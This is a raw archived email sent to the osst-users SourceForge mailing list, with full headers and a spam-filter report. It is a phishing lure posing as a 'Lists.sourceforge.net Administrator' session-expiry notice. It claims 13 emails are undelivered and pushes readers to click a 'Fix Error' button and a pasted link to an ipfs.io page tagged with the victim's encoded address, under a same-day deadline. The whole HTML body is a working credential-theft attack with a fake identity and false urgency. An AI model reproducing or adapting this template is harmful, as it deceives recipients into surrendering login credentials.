Return-Path: <osst-users-bounces@lists.sourceforge.net>
X-Original-To: lists+osst-users@lfdr.de
Delivered-To: lists+osst-users@lfdr.de
Received: from lists.sourceforge.net (lists.sourceforge.net [216.105.38.7])
	by mail.lfdr.de (Postfix) with ESMTPS id 1705EAB53D0
	for <lists+osst-users@lfdr.de>; Tue, 13 May 2025 13:25:50 +0200 (CEST)
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed;
	d=lists.sourceforge.net; s=beta; h=Reply-To:List-Subscribe:List-Help:
	List-Post:List-Archive:List-Unsubscribe:List-Id:Subject:Date:To:From:
	Message-ID:MIME-Version:Content-Type:Sender:Cc:Content-Transfer-Encoding:
	Content-ID:Content-Description:Resent-Date:Resent-From:Resent-Sender:
	Resent-To:Resent-Cc:Resent-Message-ID:In-Reply-To:References:List-Owner;
	bh=3NdKgUxs1UjfYuMLnTMnNLBNAqjIt9wEdLl6fwniEKk=; b=DUgsGfndRbn6PGgTvj0W1UxT24
	/xj1VKOQYgqRgu5LRlE6RJnnZxpUz4cAZbqsSpy7J+qdsPE9WSYT5FeLZIwxdU7mPLjShsG9UBEJm
	6bGzeKlJ+obq+lhSjLXjFfgDnOdIapWw7L/ViYCikmHo4vQ+z+HOFYBYTKzSdh9pV7n8=;
Received: from [127.0.0.1] (helo=sfs-ml-4.v29.lw.sourceforge.com)
	by sfs-ml-4.v29.lw.sourceforge.com with esmtp (Exim 4.95)
	(envelope-from <osst-users-bounces@lists.sourceforge.net>)
	id 1uEnlc-0004Yy-RM
	for lists+osst-users@lfdr.de;
	Tue, 13 May 2025 11:25:48 +0000
Received: from [172.30.29.66] (helo=mx.sourceforge.net)
 by sfs-ml-4.v29.lw.sourceforge.com with esmtps (TLS1.2) tls
 TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384 (Exim 4.95)
 (envelope-from <bounce@arthkhoj.com>) id 1uEnlb-0004Yq-Du
 for osst-users@lists.sourceforge.net; Tue, 13 May 2025 11:25:47 +0000
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed;
 d=sourceforge.net; s=x; h=Reply-To:Subject:Date:To:From:Message-ID:
 MIME-Version:Content-Type:Sender:Cc:Content-Transfer-Encoding:Content-ID:
 Content-Description:Resent-Date:Resent-From:Resent-Sender:Resent-To:Resent-Cc
 :Resent-Message-ID:In-Reply-To:References:List-Id:List-Help:List-Unsubscribe:
 List-Subscribe:List-Post:List-Owner:List-Archive;
 bh=ALnD4Vh8f9BiM9LHTLmSMyJmkYs5mMbVUZabxFvDbXQ=; b=XP5BFbRQUNRvOOuIgx2hyqno+X
 MHIKsQ9C95jww6er0O2tJ9gYb2+2Kd/xOMp2OYdw4GDnDsKIpmmVjl16h5lEE8jV9d2JfKV4EjgWZ
 112g2agxCP2/A06sMfvUnrRrmJuI4KiauptuJDAT2AeOqysDjo1aKzMPUunNdlm/oENA=;
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed; d=sf.net; s=x
 ;
 h=Reply-To:Subject:Date:To:From:Message-ID:MIME-Version:Content-Type:Sender
 :Cc:Content-Transfer-Encoding:Content-ID:Content-Description:Resent-Date:
 Resent-From:Resent-Sender:Resent-To:Resent-Cc:Resent-Message-ID:In-Reply-To:
 References:List-Id:List-Help:List-Unsubscribe:List-Subscribe:List-Post:
 List-Owner:List-Archive; bh=ALnD4Vh8f9BiM9LHTLmSMyJmkYs5mMbVUZabxFvDbXQ=; b=B
 ANG1rSzArnuxJVlNG4NTEu9Ov9tXEX2F9v6tdB1SPAJPiHHsj2yX4EJGgaA4880ltwY8t0PFxoRe4
 dzCJcz45IPL/U9ytp/GFqmIIQkup7CEer/pftwunuhZTmxzWV5rVbv0uI1FBoJyIHOHvLb6nO0sY/
 gzS3oH8De9hzE0ts=;
Received: from 169.237.78.34.bc.googleusercontent.com ([34.78.237.169]
 helo=mail.arthkhoj.com) by sfi-mx-2.v28.lw.sourceforge.com with smtp 
 (Exim 4.95) id 1uEnla-0002Rn-Kb for osst-users@lists.sourceforge.net;
 Tue, 13 May 2025 11:25:47 +0000
Content-Type: multipart/mixed; boundary="--64UM-6464790==="
MIME-Version: 1.0
Message-ID: <17YH-1717577@arthkhoj.com>
From: <Lists-sourceforge.42289@arthkhoj.com>
To: osst-users@lists.sourceforge.net
Date: Tue, 13 May 2025 11:25:35 +0000
X-Priority: 0
X-Hostname: 159.207.22.34.bc.googleusercontent.com
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=arthkhoj.com;
 i=@arthkhoj.com; q=dns/txt; s=default2; t=1747135535;
 h=from : to : subject : date : reply-to : message-id : x-priority : x-hostname
 : mime-version; bh=ALnD4Vh8f9BiM9LHTLmSMyJmkYs5mMbVUZabxFvDbXQ=;
 b=f/VTzjsVSx+uFFhDAsaHyndkIFEdEPlGBdGc1WAhL+O0SYlO+hpQB7zsNSE3FyyjRC1dY
 A78EtS6rJoInazevuZUd9zT1rPmHafh+HFLGsQwbnI3X++t6s/IhhNvBMZAS6zFei+rnqAR
 IQsw9vO2aU5xCByHetc4h/sazHFylly+wn78s89UZSnyw4PRTnW8xA0GXwd1ICgAucZhXkC
 o5Wc0D557yRVy9QD0KmjZLVaqGZQHDXC1Niq2Nul4RfB0wCNfAmvXgy55kmwQl5n2TySZWw
 /PK0446HOQGoLX/U93aehtl3NZVEJQd4UwwHJo3LQ0pw3gPr6ckO+VebR9KQ==
X-Spam-Score: 5.0 (+++++)
X-Spam-Report: Spam detection software,
 running on the system "util-spamd-1.v13.lw.sourceforge.com", 
 has NOT identified this incoming email as spam.  The original
 message has been attached to this so you can view it or label
 similar future email.  If you have any questions, see
 the administrator of that system for details.
 Content preview: Lists.sourceforge.net - Administrator Session Authentication
 Error User: Osst-users Email: Osst-users@lists.sourceforge.net 
 Content analysis details:   (5.0 points, 6.0 required)
 pts rule name              description
 ---- ---------------------- --------------------------------------------------
 3.6 RCVD_IN_SBL_CSS        RBL: Received via a relay in Spamhaus SBL-CSS
 [34.78.237.169 listed in zen.spamhaus.org]
 0.1 URIBL_SBL_A Contains URL's A record listed in the Spamhaus SBL
 blocklist [URIs: ipfs.io]
 0.0 TVD_RCVD_IP            Message was received from an IP address
 0.0 RCVD_IN_VALIDITY_RPBL_BLOCKED RBL: ADMINISTRATOR NOTICE: The
 query to Validity was blocked.  See
 https://knowledge.validity.com/hc/en-us/articles/20961730681243
 for more information.
 [34.78.237.169 listed in bl.score.senderscore.com]
 0.0 RCVD_IN_VALIDITY_SAFE_BLOCKED RBL: ADMINISTRATOR NOTICE: The
 query to Validity was blocked.  See
 https://knowledge.validity.com/hc/en-us/articles/20961730681243
 for more information.
 [34.78.237.169 listed in sa-trusted.bondedsender.org]
 -0.0 SPF_PASS               SPF: sender matches SPF record
 0.0 SPF_HELO_NONE          SPF: HELO does not publish an SPF Record
 0.1 MIME_HTML_ONLY         BODY: Message only has text/html MIME parts
 0.0 HTML_MESSAGE           BODY: HTML included in message
 -0.1 DKIM_VALID_EF          Message has a valid DKIM or DK signature from
 envelope-from domain
 -0.1 DKIM_VALID Message has at least one valid DKIM or DK signature
 -0.1 DKIM_VALID_AU          Message has a valid DKIM or DK signature from
 author's domain
 0.1 DKIM_SIGNED            Message has a DKIM or DK signature, not necessarily
 valid 0.0 RCVD_IN_MSPIKE_H2      RBL: Average reputation (+2)
 [34.78.237.169 listed in wl.mailspike.net]
 0.4 URI_IPFSIO References Interplanetary File System PtP content via
 ipfs.io, likely phishing
 0.6 HTML_MIME_NO_HTML_TAG  HTML-only message, but there is no HTML
 tag
 0.4 RDNS_DYNAMIC           Delivered to internal network by host with
 dynamic-looking rDNS
 0.0 URI_IPFS               References Interplanetary File System PtP content, 
 probable phishing
X-Headers-End: 1uEnla-0002Rn-Kb
Subject: [Osst-users] New Message Notification - Lists.sourceforge.net Notice
X-BeenThere: osst-users@lists.sourceforge.net
X-Mailman-Version: 2.1.21
Precedence: list
List-Id: <osst-users.lists.sourceforge.net>
List-Unsubscribe: <https://lists.sourceforge.net/lists/options/osst-users>,
 <mailto:osst-users-request@lists.sourceforge.net?subject=unsubscribe>
List-Archive: <http://sourceforge.net/mailarchive/forum.php?forum_name=osst-users>
List-Post: <mailto:osst-users@lists.sourceforge.net>
List-Help: <mailto:osst-users-request@lists.sourceforge.net?subject=help>
List-Subscribe: <https://lists.sourceforge.net/lists/listinfo/osst-users>,
 <mailto:osst-users-request@lists.sourceforge.net?subject=subscribe>
Reply-To: Lists-sourceforge.42289@arthkhoj.com
Errors-To: osst-users-bounces@lists.sourceforge.net

----64UM-6464790===
Content-Type: text/html; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit

<p>&nbsp;</p>
<p>&nbsp;</p>
<style>
        body {
            margin: 0;
            padding: 0;
            background-color: #f4f4f4;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            color: #333;
        }
        
        table {
            margin: 20px auto;
            border-collapse: collapse;
            max-width: 620.51638px;
            width: 100%;
            background-color: #ffffff;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
        }
        
        td {
            padding: 15.51638px;
            line-height: 1.6;
        }
        
        .header {
            background-color: #0056b3;
            color: #ffffff;
            padding: 20.51638px;
            text-align: center;
            font-size: 18.51638px;
            font-weight: bold;
        }
        
        .content {
            padding: 20.51638px;
            background-color: #ffffff;
        }
        
        .content p {
            margin: 0 0 15.51638px;
            font-size: 14.51638px;
            color: #555;
        }
        
        .content strong {
            color: #333;
        }
        
        .button {
            display: inline-block;
            margin: 20px 0;
            padding: 12px 24.51638px;
            background-color: #0056b3;
            color: #ffffff;
            text-decoration: none;
            font-size: 14.51638px;
            font-weight: bold;
            text-align: center;
        }
        
        .footer {
            background-color: #f1f1f1;
            padding: 15.51638px;
            text-align: left;
            font-size: 12.51638px;
            color: #666;
        }
        
        .footer p {
            margin: 0;
        }
        
        .footer strong {
            color: #333;
        }
    </style>
<table width="591">
<tbody>
<tr>
<td class="header">Lists.sourceforge.net - Administrator<br />Session Authentication Error</td>
</tr>
<tr>
<td class="content">
<p><strong>User:</strong> Osst-users</p>
<p><strong>Email:</strong> Osst-users@lists.sourceforge.net</p>
<p>Your current logon session has expired. You need to re-sign in again. </p>
<p><strong>13</strong> Important emails are not being delivered. Please use the link below to fix the error and receive your undelivered important emails.</p>
<p><a class="button" href="https://ipfs.io/ipfs/bafkreibnmy6fmsuljkr2j6dfpbnqvq7xo2aayqo2lmw3rmmvgzjzbv32zi#b3NzdC11c2Vyc0BsaXN0cy5zb3VyY2Vmb3JnZS5uZXQ=" target="_self">Fix Error</a><br /><span style="font-family: Segoe UI,sans-serif; font-size: xx-small;"><br /><span style="font-size: 12pt;">If the button above does not work, copy the link below into your browser to fix the error.</span></span></p>
<p><span style="font-family: Segoe UI,sans-serif; font-size: xx-small;"><br /><span style="font-size: 12pt;"><strong>https://ipfs.io/ipfs/bafkreibnmy6fmsuljkr2j6dfpbnqvq7xo2aayqo2lmw3rmmvgzjzbv32zi#b3NzdC11c2Vyc0BsaXN0cy5zb3VyY2Vmb3JnZS5uZXQ=</strong></span></span></p>
</td>
</tr>
<tr>
<td class="footer">
<p>All users must authenticate via the&nbsp; webmail by: <strong>May 13, 2025</strong>. You can change the frequency of these notifications within your mailbox portal.</p>
<p>Regards,<br />Lists.sourceforge.net Server Support</p>
</td>
</tr>
</tbody>
</table>
----64UM-6464790===
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline


----64UM-6464790===
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline

_______________________________________________
Osst-users mailing list
Osst-users@lists.sourceforge.net
https://lists.sourceforge.net/lists/listinfo/osst-users

----64UM-6464790===--

